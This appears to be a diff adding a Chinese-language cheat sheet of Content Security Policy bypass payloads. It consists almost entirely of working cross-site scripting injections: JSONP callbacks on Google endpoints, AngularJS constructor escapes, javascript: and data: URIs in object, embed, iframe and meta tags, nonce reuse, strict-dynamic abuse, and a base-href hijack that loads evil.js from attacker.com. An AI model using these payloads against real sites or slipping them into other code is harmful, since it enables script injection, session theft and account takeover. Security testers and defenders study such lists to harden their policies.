@@ -1,0 +1,43 @@
+# CSP 绕过
+# JSONP 回调
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
+
+# Angular 绕过
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+# 基于 DOM 的绕过
+<script src="data:,alert(1)"></script>
+<script src="blob:..."></script>
+
+# base-uri 绕过
+<base href="https://attacker.com/">
+<script src="/evil.js"></script>
+
+# 重定向绕过
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# object-src 绕过
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# frame-src 绕过
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# 内联事件 (如果允许 unsafe-inline)
+<img src=x onerror=alert(1)>
+
+# nonce 猜测/泄露
+<script nonce="leaked-nonce">alert(1)</script>
+
+# strict-dynamic 绕过
+<script src="trusted.js"></script>
+// trusted.js 中: document.write('<script>alert(1)<\/script>')
+
+# 上传绕过
+<script src="/uploads/evil.js"></script>
+<script src="/api/jsonp?callback=alert"></script>
